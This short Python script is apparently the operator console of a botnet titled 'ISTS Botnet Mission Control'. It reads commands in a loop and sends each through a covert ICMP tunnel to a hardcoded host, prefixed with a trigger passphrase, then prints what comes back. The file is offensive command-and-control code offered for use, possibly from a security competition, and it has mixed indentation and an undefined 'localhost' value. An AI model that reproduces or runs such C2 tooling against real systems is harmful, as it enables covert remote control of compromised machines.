from icmp_tunnel import *
import sys
import Queue

responseQueue = Queue.Queue()

def main():
	listener = Listener(responseQueue)
	listener.start()
	print(" - ISTS Botnet Mission Control - ")
    	print("\thelp - to list commands")
	while True:

   		sys.stdout.write(">>>")
		cmd = raw_input("")
		send_icmp(localhost, "10.80.100.35", "OkayNowYouCanUseMe"+cmd)
	
		if not responseQueue.empty():
			print(responseQueue.get())
				
if __name__ == "__main__":
    main()
